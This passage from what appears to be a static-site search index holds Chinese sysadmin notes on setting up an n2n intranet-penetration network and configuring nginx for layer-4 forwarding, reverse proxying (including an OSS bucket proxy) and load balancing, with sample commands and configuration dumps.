\u96c6\u7fa4\u7684\u57fa\u4e8e Web \u7684\u952e\u503c\u67e5\u770b\u5668\u3002 etcd-manager - \u73b0\u4ee3\u3001\u9ad8\u6548\u3001\u591a\u5e73\u53f0\u548c\u514d\u8d39\u7684 etcd 3.x GUI \u548c\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u9002\u7528\u4e8e Windows\u3001Linux \u548c Mac\u3002","title":"API\u63a5\u53e3"},{"location":"middleware/n2n/n2n/","text":"n2n \u5185\u7f51\u7a7f\u900f n2n \u53ef\u4ee5\u8fdb\u884c\u5185\u7f51\u7a7f\u900f\uff0c\u628a\u5404\u5730\u7684\u8282\u70b9\u548c\u4e2d\u5fc3\u7ec4\u6210\u4e2a\u5c40\u57df\u7f51 \u4e3b\u673a\u540d n2n\u7248\u672c IP \u865a\u62dfIP supernode 3.1.0 121.121.121.121 agent1 3.1.0 192.168.8.66 192.168.100.3 agent2 3.1.0 192.168.74.128 192.168.100.1 \u5728\u4e00\u53f0\u6709\u516c\u7f51\u5730\u5740\u7684\u4e3b\u673a\u4e0a\u90e8\u7f72 \u201d\u8d85\u7ea7\u4e2d\u5fc3\u201c\uff0c\u5f00\u653e31754\u7aef\u53e3\uff0c\u516c\u7f51\u5730\u5740121.121.121.121 [root@supernode ~]# wget https://github.com/ntop/n2n/releases/download/3.1.0/n2n-3.1.0-1073.x86_64.rpm [root@supernode ~]# yum install epel-release [root@supernode ~]# yum install -y n2n-3.1.0-1073.x86_64.rpm [root@supernode ~]# cd /etc/n2n/ [root@supernode ~]# cp supernode.conf.sample supernode.conf [root@supernode ~]# vim supernode.conf -p=31754 [root@supernode ~]# sudo systemctl start supernode \u8fd9\u6837\u5c31\u542f\u52a8\u8d85\u7ea7\u8282\u70b9 \u7136\u540e\u5ba2\u6237\u7aef\u53bb\u8fde\u63a5\u8d85\u7ea7\u8282\u70b9\uff0c\u5ba2\u6237\u7aef\u4e4b\u95f4\u5c31\u53ef\u4ee5\u4e92\u76f8ping\uff0c\u4e92\u76f8\u8fde\u63a5\u4e86 \u4e0b\u9762\u662fagent1 \u63a5\u5165 \u8d85\u7ea7\u4e2d\u5fc3 [root@agent1 ~]# wget https://github.com/ntop/n2n/releases/download/3.1.0/n2n-3.1.0-1073.x86_64.rpm [root@agent1 ~]# yum install epel-release [root@agent1 ~]# yum install -y n2n-3.1.0-1073.x86_64.rpm [root@agent1 ~]# [root@agent1 ~]# edge -c myinnetwork -k myinsecretpass -a 192.168.100.3 -f -l 121.121.121.121:31754 \u51fa\u73b0\u4e0b\u9762\u8fd9\u884c\u5c31\u6210\u529f\u4e86 21/Dec/2021 20:03:41 [edge_utils.c:2731] [OK] edge <<< ================ >>> supernode agent1 edge -c myinnetwork -k myinsecretpass -a 192.168.100.3 -f -l 121.121.121.121:31754 \u8fd9\u884c\u7684\u610f\u601d\u662f -c \u6307\u5b9a\u7f51\u7edc\u540d\u79f0 -k \u6307\u5b9a\u63a5\u5165\u7684\u5bc6\u7801 -a \u7ed9\u81ea\u5df1\u8bbe\u5b9a\u7684\u865a\u62dfIP -l \u63a5\u5165\u8d85\u7ea7\u4e2d\u5fc3\u7684\u8282\u70b9 \u4e0b\u9762\u662fagent2 \u63a5\u5165 \u8d85\u7ea7\u4e2d\u5fc3 [root@agent2 ~]# wget https://github.com/ntop/n2n/releases/download/3.1.0/n2n-3.1.0-1073.x86_64.rpm [root@agent2 ~]# yum install epel-release [root@agent2 ~]# yum install -y n2n-3.1.0-1073.x86_64.rpm [root@agent2 ~]# [root@agent2 ~]# edge -c myinnetwork -k myinsecretpass -a 192.168.100.1 -f -l 121.121.121.121:31754 \u51fa\u73b0\u4e0b\u9762\u8fd9\u884c\u5c31\u6210\u529f\u4e86 21/Dec/2021 20:03:41 [edge_utils.c:2731] [OK] edge <<< ================ >>> supernode \u67e5\u770bagent2\u7684 IP\u4fe1\u606f [root@agent2 ~]# ip addr 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:5e:74:39 brd ff:ff:ff:ff:ff:ff inet 192.168.74.128/24 brd 192.168.74.255 scope global noprefixroute dynamic ens33 valid_lft 1284sec preferred_lft 1284sec inet6 fe80::2976:eaa3:a0b4:f828/64 scope link noprefixroute valid_lft forever preferred_lft forever 3: edge0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1290 qdisc pfifo_fast state UNKNOWN group default qlen 1000 link/ether b6:60:36:ce:7c:fa brd ff:ff:ff:ff:ff:ff inet 192.168.100.1/24 brd 192.168.100.255 scope global edge0 valid_lft forever preferred_lft forever inet6 fe80::b460:36ff:fece:7cfa/64 scope link valid_lft forever preferred_lft forever \u7136\u540eping agent1 \uff0c\u53ef\u4ee5ping\u901a [root@agent2 ~]# ping 192.168.100.3 PING 192.168.100.3 (192.168.100.3) 56(84) bytes of data. 64 bytes from 192.168.100.3: icmp_seq=1 ttl=64 time=0.397 ms 64 bytes from 192.168.100.3: icmp_seq=2 ttl=64 time=0.485 ms ^C --- 192.168.100.3 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1001ms rtt min/avg/max/mdev = 0.397/0.441/0.485/0.044 ms [root@server ~]# \u7136\u540e agent2\u90e8\u7f72nginx\u5bb9\u5668 [root@agent2 ~]# docker run --name nginx -p 80:80 -d nginx 0c32734399d94dae4df9b651741aa1a7e6f6336d8aaf4bb6cb10d934878ceaad [root@agent2 ~]# [root@agent2 ~]# [root@agent2 ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 0c32734399d9 nginx \"/docker-entrypoint.\u2026\" 2 seconds ago Up 2 seconds 0.0.0.0:80->80/tcp, :::80->80/tcp nginx \u7136\u540e\u5728agent1 \u4e0a\u8fdb\u884c\u8bbf\u95ee\uff0c\u53ef\u4ee5\u8bbf\u95ee\u901a [root@agent1 ~]# curl 192.168.100.1:80 <!DOCTYPE html> <html> <head> <title>Welcome to nginx!</title> <style> html { color-scheme: light dark; } body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } </style> </head> <body> <h1>Welcome to nginx!</h1> <p>If you see this page, the nginx web server is successfully installed and working. Further configuration is required.</p> <p>For online documentation and support please refer to <a href=\"http://nginx.org/\">nginx.org</a>.<br/> Commercial support is available at <a href=\"http://nginx.com/\">nginx.com</a>.</p> <p><em>Thank you for using nginx.</em></p> </body> </html> [root@agent1 ~]#","title":"n2n"},{"location":"middleware/nginx/nginx4%E5%B1%82%E8%BD%AC%E5%8F%91/","text":"Nginx\u57281.9\u7248\u672c\u4e4b\u540e\u5c31\u53ef\u4ee5\u914d\u7f6e4\u5c42\u7684\u8f6c\u53d1\uff1a Module ngx_stream_core_module (nginx.org) \u9700\u8981\u5728\u914d\u7f6e\u4e2d\u6dfb\u52a0 --with-stream 4\u5c42\u8f6c\u53d1\u65e0\u6cd5\u8bc6\u522bhttp\u7b49\u534f\u8bae\uff0c\u6b64\u65f6\u7684proxy_pass\u4e3a \u6a21\u5757ngx_stream_proxy_module (p2hp.com) 4\u5c42\u8f6c\u53d1\u53ef\u4ee5\u7528\u4f5c4\u5c42\u53cd\u5411\u4ee3\u7406\u53ca4\u5c42\u8d1f\u8f7d\u5747\u8861 [root@VM-0-16-centos sbin]# ./nginx -V nginx version: nginx/1.24.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/usr/local/nginx --with-stream --with-http_stub_status_module --with-http_ssl_module [root@VM-0-16-centos sbin]# cd /usr/local/webserver/nginx/conf/ [root@VM-0-16-centos conf]# cat nginx.conf worker_processes 1; events { worker_connections 1024; } stream { upstream bak { server localhost:3306 weight=5; server localhost:80 weight=50; #\u5fc5\u987b\u914d\u7f6e\u3010\u4e3b\u673a\u540d\u6216\u8005IP\u3011+\u7aef\u53e3\uff0c\u53ef\u4ee5\u914d\u7f6e\u591a\u4e2a\uff0c\u90a3\u4e48\u5c31\u662f4\u5c42\u8d1f\u8f7d\u5747\u8861\uff0c\u8fd8\u53ef\u4ee5\u8bbe\u7f6e\u6743\u91cd } server { listen 8080; proxy_pass bak; #\u8bbf\u95ee\u672c\u673a\u76848080,\u5c31\u4f1a\u628a\u8bf7\u6c42\u8f6c\u53d1\u5230bak\u670d\u52a1\u7ec4\u4e2d } } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 3306; server_name localhost; location / { root html; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } \u6700\u7b80\u5355\u76844\u5c42\u8f6c\u53d1\uff1a worker_processes 1; events { worker_connections 1024; } stream { upstream bak { server localhost:22; #\u8f6c\u53d1\u672c\u673a\u768422\u7aef\u53e3\u52308080\u7aef\u53e3 } server { listen 8080; proxy_pass bak; } }","title":"Nginx4\u5c42\u8f6c\u53d1"},{"location":"middleware/nginx/nginx7%E5%B1%82%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/","text":"\u6700\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u914d\u7f6e 7\u5c42\u53ef\u4ee5\u8bc6\u522bhttp\u534f\u8bae\uff0c\u6b64\u65f6\u7684proxy_pass\u4e3a\uff1a \u6a21\u5757ngx_http_proxy_module (p2hp.com) worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 3306; server_name localhost; location / { root html; index index.html index.htm; proxy_pass https://www.baidu.com; #\u8bbf\u95ee\u672c\u673a\u76843306\uff0c\u8bf7\u6c42\u4f1a\u8f6c\u53d1\u5230\u767e\u5ea6,\u4e00\u4e2aserver\u53ea\u80fd\u914d\u7f6e\u4e00\u4e2aproxy_pass } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } \u6211\u751f\u4ea7\u7cfb\u7edf\u4f7f\u7528\u7684nginx\u53cd\u5411\u4ee3\u7406\u914d\u7f6e [root@VM-0-16-centos ~] nginx -T | grep -v '^$' nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful # configuration file /etc/nginx/modules-enabled/50-mod-http-geoip.conf: load_module modules/ngx_http_geoip_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-http-image-filter.conf: load_module modules/ngx_http_image_filter_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf: load_module modules/ngx_http_xslt_filter_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-mail.conf: load_module modules/ngx_mail_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-stream.conf: load_module modules/ngx_stream_module.so; # configuration file /etc/nginx/mime.types: types { text/html html htm shtml; text/css css; text/xml xml; image/gif gif; image/jpeg jpeg jpg; application/javascript js; application/atom+xml atom; application/rss+xml rss; text/mathml mml; text/plain txt; text/vnd.sun.j2me.app-descriptor jad; text/vnd.wap.wml wml; text/x-component htc; image/png png; image/tiff tif tiff; image/vnd.wap.wbmp wbmp; image/x-icon ico; image/x-jng jng; image/x-ms-bmp bmp; image/svg+xml svg svgz; image/webp webp; application/font-woff woff; application/java-archive jar war ear; application/json json; application/mac-binhex40 hqx; application/msword doc; application/pdf pdf; application/postscript ps eps ai; application/rtf rtf; application/vnd.apple.mpegurl m3u8; application/vnd.ms-excel xls; application/vnd.ms-fontobject eot; application/vnd.ms-powerpoint ppt; application/vnd.wap.wmlc wmlc; application/vnd.google-earth.kml+xml kml; application/vnd.google-earth.kmz kmz; application/x-7z-compressed 7z; application/x-cocoa cco; application/x-java-archive-diff jardiff; application/x-java-jnlp-file jnlp; application/x-makeself run; application/x-perl pl pm; application/x-pilot prc pdb; application/x-rar-compressed rar; application/x-redhat-package-manager rpm; application/x-sea sea; application/x-shockwave-flash swf; application/x-stuffit sit; application/x-tcl tcl tk; application/x-x509-ca-cert der pem crt; application/x-xpinstall xpi; application/xhtml+xml xhtml; application/xspf+xml xspf; application/zip zip; application/octet-stream bin exe dll; application/octet-stream deb; application/octet-stream dmg; application/octet-stream iso img; application/octet-stream msi msp msm; application/vnd.openxmlformats-officedocument.wordprocessingml.document docx; application/vnd.openxmlformats-officedocument.spreadsheetml.sheet xlsx; application/vnd.openxmlformats-officedocument.presentationml.presentation pptx; audio/midi mid midi kar; audio/mpeg mp3; audio/ogg ogg; audio/x-m4a m4a; audio/x-realaudio ra; video/3gpp 3gpp 3gp; video/mp2t ts; video/mp4 mp4; video/mpeg mpeg mpg; video/quicktime mov; video/webm webm; video/x-flv flv; video/x-m4v m4v; video/x-mng mng; video/x-ms-asf asx asf; video/x-ms-wmv wmv; video/x-msvideo avi; } # configuration file /etc/nginx/nginx.conf: user www-data; worker_processes auto; pid /run/nginx.pid; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; } http { sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; gzip on; client_max_body_size 500m; # \u6307\u4ee4\u7528\u4e8e\u8bbe\u7f6e\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e3b\u4f53\u7684\u6700\u5927\u5141\u8bb8\u5927\u5c0f\uff0c\u5373\u5ba2\u6237\u7aef\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u6570\u636e\u7684\u5927\u5c0f\u4e0a\u9650\uff0c\uff0c\u9ed8\u8ba4\u4e3a1M include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } server { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } } # configuration file /etc/nginx/conf.d/1_1_1_1_8080.conf: server { listen 8083; server_name 0.0.0.0; default_type 'text/html'; charset utf-8; #access_log /var/log/nginx/host.access.log main; location / { proxy_pass http://1.1.1.1:8083; } } \u7ed9OSS\u505a\u53cd\u5411\u4ee3\u7406 \u7ed9OSS\u505a\u7684\u53cd\u5411\u4ee3\u7406\u914d\u7f6e\uff1a user nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; include /usr/share/nginx/modules/*.conf; events { worker_connections 1024; } http { log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 4096; server_tokens off; proxy_hide_header X-Powered-By; proxy_hide_header Server; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server { listen 81 default_server; ## \u53cd\u5411\u4ee3\u7406\u7684\u7aef\u53e3 server_name 1.1.1.1 oss.ganxie.com; ## \u5c06\u53cd\u5411\u4ee3\u7406IP(\u4e5f\u5c31\u662f\u90e8\u7f72nginx\u7684ECS IP)\u3001OSS endpoint\u539f\u59cb\u57df\uff0c\u90fd\u4f5c\u4e3aserver_name\u3002\u786e\u4fdd\u65e0\u8bba\u4f7f\u7528IP\u5730\u5740\u8fd8\u662f\u65b0\u57df\u540d\u7684\u8bf7\u6c42\u90fd\u80fd\u88ab\u6b63\u786e\u5904\u7406\u3002 root /usr/share/nginx/html; include /etc/nginx/default.d/*.conf; location / { proxy_pass http://oss.ganxie.com; ## \u5c06\u8bbf\u95eenginx \u53cd\u5411\u4ee3\u7406\u57df\u540d(IP)\u7684\u8bf7\u6c42\uff0c\u8f6c\u53d1\u5230OSS bucket\u771f\u6b63\u7684\u57df\u540d\u3002 proxy_set_header Host $http_host; # \u6307\u4ee4\u5141\u8bb8\u4f60\u8bbe\u7f6e\u6216\u91cd\u5199\u5411\u540e\u7aef\u670d\u52a1\u5668\u53d1\u9001\u7684\u8bf7\u6c42\u5934\u90e8\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNginx \u4e0d\u4f1a\u4f20\u9012\u6240\u6709\u6765\u81ea\u539f\u59cb\u8bf7\u6c42\u7684\u5934\u90e8\u4fe1\u606f\u3002\u8fd9\u91cc\u00b7$http_host'\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u4ee3\u8868\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e2d\u7684 Host \u5934\u90e8\u7684\u503c\u3002\u8fd9\u6837\u7684\u6539\u52a8\u610f\u5473\u7740\u540e\u7aef\u670d\u52a1\u5668\u73b0\u5728\u63a5\u6536\u5230\u7684 Host \u5934\u90e8\u5c06\u4e0e\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9Nginx \u7684\u539f\u59cb Host \u5934\u90e8\u4e00\u81f4\u3002\u8fd9\u6837\u4fdd\u6301\u5e94\u7528\u7cfb\u7edf\u539f\u59cbIP\u8bbf\u95eeOSS bucket\u914d\u7f6e\u7684endpoint \u57df\u540dhost\uff0c\u5426\u5219\u8fd8\u4f1a\u51fa\u73b0\u9274\u6743\u95ee\u9898\u3002 } } } \u9664\u4e86\u8fd9\u4e2a\u4e4b\u5916\uff0c\u8981\u8bbf\u95eeOSS\u7684\u5e94\u7528\uff0c\u5e94\u7528\u6240\u5728\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u9700\u8981\u914d\u7f6e\u4e00\u4e0bhosts\u6587\u4ef6\u3002 # \u5e94\u7528\u7a0b\u5e8f\u6240\u5728\u7684\u64cd\u4f5c\u7cfb\u7edfhosts\u6587\u4ef6\u6dfb\u52a0\u5982\u4e0b\uff1a nginx\u4ee3\u7406\u7684IP OSS_endpoint_\u539f\u59cb\u57df\u540d nginx\u4ee3\u7406\u7684IP bucketname_OSS_endpoint_\u539f\u59cb\u57df\u540d OSS\u4e0a\u4f20\u4e0b\u8f7d\u6162\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u5206\u7247\u5927\u5c0f\uff0c\u5e76\u53d1\u6570\uff0c\u8bbe\u7f6e\u65ad\u70b9\u7eed\u4f20\u6587\u4ef6\u7684\u5927\u5c0f\u9608\u503c\u6765\u4f18\u5316\u65f6\u95f4","title":"Nginx7\u5c42\u53cd\u5411\u4ee3\u7406"},{"location":"middleware/nginx/nginx7%E5%B1%82%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/#_1","text":"7\u5c42\u53ef\u4ee5\u8bc6\u522bhttp\u534f\u8bae\uff0c\u6b64\u65f6\u7684proxy_pass\u4e3a\uff1a \u6a21\u5757ngx_http_proxy_module (p2hp.com) worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 3306; server_name localhost; location / { root html; index index.html index.htm; proxy_pass https://www.baidu.com; #\u8bbf\u95ee\u672c\u673a\u76843306\uff0c\u8bf7\u6c42\u4f1a\u8f6c\u53d1\u5230\u767e\u5ea6,\u4e00\u4e2aserver\u53ea\u80fd\u914d\u7f6e\u4e00\u4e2aproxy_pass } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } \u6211\u751f\u4ea7\u7cfb\u7edf\u4f7f\u7528\u7684nginx\u53cd\u5411\u4ee3\u7406\u914d\u7f6e [root@VM-0-16-centos ~] nginx -T | grep -v '^$' nginx: the configuration file /etc/nginx/nginx.conf syntax is ok nginx: configuration file /etc/nginx/nginx.conf test is successful # configuration file /etc/nginx/modules-enabled/50-mod-http-geoip.conf: load_module modules/ngx_http_geoip_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-http-image-filter.conf: load_module modules/ngx_http_image_filter_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf: load_module modules/ngx_http_xslt_filter_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-mail.conf: load_module modules/ngx_mail_module.so; # configuration file /etc/nginx/modules-enabled/50-mod-stream.conf: load_module modules/ngx_stream_module.so; # configuration file /etc/nginx/mime.types: types { text/html html htm shtml; text/css css; text/xml xml; image/gif gif; image/jpeg jpeg jpg; application/javascript js; application/atom+xml atom; application/rss+xml rss; text/mathml mml; text/plain txt; text/vnd.sun.j2me.app-descriptor jad; text/vnd.wap.wml wml; text/x-component htc; image/png png; image/tiff tif tiff; image/vnd.wap.wbmp wbmp; image/x-icon ico; image/x-jng jng; image/x-ms-bmp bmp; image/svg+xml svg svgz; image/webp webp; application/font-woff woff; application/java-archive jar war ear; application/json json; application/mac-binhex40 hqx; application/msword doc; application/pdf pdf; application/postscript ps eps ai; application/rtf rtf; application/vnd.apple.mpegurl m3u8; application/vnd.ms-excel xls; application/vnd.ms-fontobject eot; application/vnd.ms-powerpoint ppt; application/vnd.wap.wmlc wmlc; application/vnd.google-earth.kml+xml kml; application/vnd.google-earth.kmz kmz; application/x-7z-compressed 7z; application/x-cocoa cco; application/x-java-archive-diff jardiff; application/x-java-jnlp-file jnlp; application/x-makeself run; application/x-perl pl pm; application/x-pilot prc pdb; application/x-rar-compressed rar; application/x-redhat-package-manager rpm; application/x-sea sea; application/x-shockwave-flash swf; application/x-stuffit sit; application/x-tcl tcl tk; application/x-x509-ca-cert der pem crt; application/x-xpinstall xpi; application/xhtml+xml xhtml; application/xspf+xml xspf; application/zip zip; application/octet-stream bin exe dll; application/octet-stream deb; application/octet-stream dmg; application/octet-stream iso img; application/octet-stream msi msp msm; application/vnd.openxmlformats-officedocument.wordprocessingml.document docx; application/vnd.openxmlformats-officedocument.spreadsheetml.sheet xlsx; application/vnd.openxmlformats-officedocument.presentationml.presentation pptx; audio/midi mid midi kar; audio/mpeg mp3; audio/ogg ogg; audio/x-m4a m4a; audio/x-realaudio ra; video/3gpp 3gpp 3gp; video/mp2t ts; video/mp4 mp4; video/mpeg mpeg mpg; video/quicktime mov; video/webm webm; video/x-flv flv; video/x-m4v m4v; video/x-mng mng; video/x-ms-asf asx asf; video/x-ms-wmv wmv; video/x-msvideo avi; } # configuration file /etc/nginx/nginx.conf: user www-data; worker_processes auto; pid /run/nginx.pid; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; } http { sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; include /etc/nginx/mime.types; default_type application/octet-stream; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; gzip on; client_max_body_size 500m; # \u6307\u4ee4\u7528\u4e8e\u8bbe\u7f6e\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e3b\u4f53\u7684\u6700\u5927\u5141\u8bb8\u5927\u5c0f\uff0c\u5373\u5ba2\u6237\u7aef\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u6570\u636e\u7684\u5927\u5c0f\u4e0a\u9650\uff0c\uff0c\u9ed8\u8ba4\u4e3a1M include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } server { listen 80 default_server; listen [::]:80 default_server; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } } # configuration file /etc/nginx/conf.d/1_1_1_1_8080.conf: server { listen 8083; server_name 0.0.0.0; default_type 'text/html'; charset utf-8; #access_log /var/log/nginx/host.access.log main; location / { proxy_pass http://1.1.1.1:8083; } }","title":"\u6700\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u914d\u7f6e"},{"location":"middleware/nginx/nginx7%E5%B1%82%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/#oss","text":"\u7ed9OSS\u505a\u7684\u53cd\u5411\u4ee3\u7406\u914d\u7f6e\uff1a user nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; include /usr/share/nginx/modules/*.conf; events { worker_connections 1024; } http { log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' '$status $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; access_log /var/log/nginx/access.log main; sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 4096; server_tokens off; proxy_hide_header X-Powered-By; proxy_hide_header Server; include /etc/nginx/mime.types; default_type application/octet-stream; include /etc/nginx/conf.d/*.conf; server { listen 81 default_server; ## \u53cd\u5411\u4ee3\u7406\u7684\u7aef\u53e3 server_name 1.1.1.1 oss.ganxie.com; ## \u5c06\u53cd\u5411\u4ee3\u7406IP(\u4e5f\u5c31\u662f\u90e8\u7f72nginx\u7684ECS IP)\u3001OSS endpoint\u539f\u59cb\u57df\uff0c\u90fd\u4f5c\u4e3aserver_name\u3002\u786e\u4fdd\u65e0\u8bba\u4f7f\u7528IP\u5730\u5740\u8fd8\u662f\u65b0\u57df\u540d\u7684\u8bf7\u6c42\u90fd\u80fd\u88ab\u6b63\u786e\u5904\u7406\u3002 root /usr/share/nginx/html; include /etc/nginx/default.d/*.conf; location / { proxy_pass http://oss.ganxie.com; ## \u5c06\u8bbf\u95eenginx \u53cd\u5411\u4ee3\u7406\u57df\u540d(IP)\u7684\u8bf7\u6c42\uff0c\u8f6c\u53d1\u5230OSS bucket\u771f\u6b63\u7684\u57df\u540d\u3002 proxy_set_header Host $http_host; # \u6307\u4ee4\u5141\u8bb8\u4f60\u8bbe\u7f6e\u6216\u91cd\u5199\u5411\u540e\u7aef\u670d\u52a1\u5668\u53d1\u9001\u7684\u8bf7\u6c42\u5934\u90e8\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNginx \u4e0d\u4f1a\u4f20\u9012\u6240\u6709\u6765\u81ea\u539f\u59cb\u8bf7\u6c42\u7684\u5934\u90e8\u4fe1\u606f\u3002\u8fd9\u91cc\u00b7$http_host'\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u4ee3\u8868\u5ba2\u6237\u7aef\u8bf7\u6c42\u4e2d\u7684 Host \u5934\u90e8\u7684\u503c\u3002\u8fd9\u6837\u7684\u6539\u52a8\u610f\u5473\u7740\u540e\u7aef\u670d\u52a1\u5668\u73b0\u5728\u63a5\u6536\u5230\u7684 Host \u5934\u90e8\u5c06\u4e0e\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9Nginx \u7684\u539f\u59cb Host \u5934\u90e8\u4e00\u81f4\u3002\u8fd9\u6837\u4fdd\u6301\u5e94\u7528\u7cfb\u7edf\u539f\u59cbIP\u8bbf\u95eeOSS bucket\u914d\u7f6e\u7684endpoint \u57df\u540dhost\uff0c\u5426\u5219\u8fd8\u4f1a\u51fa\u73b0\u9274\u6743\u95ee\u9898\u3002 } } } \u9664\u4e86\u8fd9\u4e2a\u4e4b\u5916\uff0c\u8981\u8bbf\u95eeOSS\u7684\u5e94\u7528\uff0c\u5e94\u7528\u6240\u5728\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u9700\u8981\u914d\u7f6e\u4e00\u4e0bhosts\u6587\u4ef6\u3002 # \u5e94\u7528\u7a0b\u5e8f\u6240\u5728\u7684\u64cd\u4f5c\u7cfb\u7edfhosts\u6587\u4ef6\u6dfb\u52a0\u5982\u4e0b\uff1a nginx\u4ee3\u7406\u7684IP OSS_endpoint_\u539f\u59cb\u57df\u540d nginx\u4ee3\u7406\u7684IP bucketname_OSS_endpoint_\u539f\u59cb\u57df\u540d OSS\u4e0a\u4f20\u4e0b\u8f7d\u6162\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u5206\u7247\u5927\u5c0f\uff0c\u5e76\u53d1\u6570\uff0c\u8bbe\u7f6e\u65ad\u70b9\u7eed\u4f20\u6587\u4ef6\u7684\u5927\u5c0f\u9608\u503c\u6765\u4f18\u5316\u65f6\u95f4","title":"\u7ed9OSS\u505a\u53cd\u5411\u4ee3\u7406"},{"location":"middleware/nginx/nginx7%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/","text":"\u6700\u7b80\u5355\u76847\u5c42\u8d1f\u8f7d\u5747\u8861 worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; server { listen 9001; server_name localhost; default_type text/html; location / { return 200 '<h1>server:9001</h1>'; } } server { listen 9002; server_name localhost; default_type text/html; location / { return 200 '<h1>server:9002</h1>'; } } server { listen 9003; server_name localhost; default_type text/html; location / { return 200 '<h1>server:9003</h1>'; } } upstream backend { server localhost:9001; server localhost:9002; server localhost:9003; } server { listen 8080; server_name localhost; location / { proxy_pass http://backend/; } } } \u5728server\u540e\u9762\u53ef\u4ee5\u52a0\u4e00\u4e9b\u53c2\u6570\uff0c\u6bd4\u5982\u6743\u91cd\u3001\u8d85\u65f6\u7b49\u3002\u5177\u4f53\u67e5\u770b\u5b98\u65b9\u63cf\u8ff0\uff1a Module ngx_http_upstream_module (p2hp.com)","title":"Nginx7\u5c42\u8d1f\u8f7d\u5747\u8861"},{"location":"middleware/nginx/nginx_cmd/","text":"nginx\u547d\u4ee4\u53c2\u6570 Command-line parameters (p2hp.com) [root@VM-0-16-centos sbin]# ./nginx -h nginx version: nginx/1.24.0 Usage: nginx [-?hvVtTq] [-s signal] [-p prefix] [-e filename] [-c filename] [-g directives] \u9009\u9879: -?,-h : \u6b64\u5e2e\u52a9 -v : \u663e\u793a\u7248\u672c\u5e76\u9000\u51fa -V : 